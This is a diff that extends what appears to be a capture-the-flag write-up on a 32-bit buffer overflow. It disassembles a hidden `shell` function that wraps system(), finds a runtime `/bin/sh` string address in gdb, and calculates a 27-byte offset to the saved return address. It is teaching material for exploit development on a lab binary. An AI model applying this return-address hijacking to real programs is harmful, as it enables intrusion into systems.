@@ -95,3 +95,46 @@ Listing the binary's functions shows one that `main` never calls:
 `shell` is present but unreferenced by the normal control flow, which is the giveaway that it is the intended target. Disassembling it:
 
 ![](./img/disassemble_shell_2B.png)
+
+```asm
+0x080486bd <+0>:   push   ebp
+0x080486be <+1>:   mov    ebp,esp
+0x080486c0 <+3>:   sub    esp,0x18
+0x080486c3 <+6>:   mov    eax,DWORD PTR [ebp+0x8]  ; cmd (shell's argument)
+0x080486c6 <+9>:   mov    DWORD PTR [esp],eax
+0x080486c9 <+12>:  call   0x8048590 <system@plt>   ; system(cmd)
+0x080486ce <+17>:  leave
+0x080486cf <+18>:  ret
+```
+
+`shell(char *cmd)` is just `system(cmd)`. So returning into `shell` is not enough on its own, we also have to supply the argument it passes to `system`, and that argument must point at a `/bin/sh` string. The binary holds one at `0x080497d0`.
+
+Reading that address directly, before running the program, fails:
+
+```asm
+gdb-peda$ x/s 0x080497d0
+0x80497d0:	<error: Cannot access memory at address 0x80497d0>
+```
+
+The region is not mapped until the process starts, so a static read has nothing to show. We break inside the program and read it once it is live:
+
+```asm
+gdb-peda$ b *print_name
+gdb-peda$ run test
+gdb-peda$ x/s 0x080497d0
+0x80497d0:	"/bin/sh"
+```
+
+The address holds `/bin/sh` at runtime, which is what matters for the exploit.
+
+## Offset
+
+The buffer is at `ebp-0x17` and the saved return address is at `ebp+0x4`:
+
+```
+buffer         = ebp - 0x17
+saved ret addr = ebp + 0x04
+distance       = 0x17 + 0x04 = 0x1b = 27 bytes
+```
+
+So 27 bytes of filler reach the saved return address, and the next 4 bytes become the new return target.
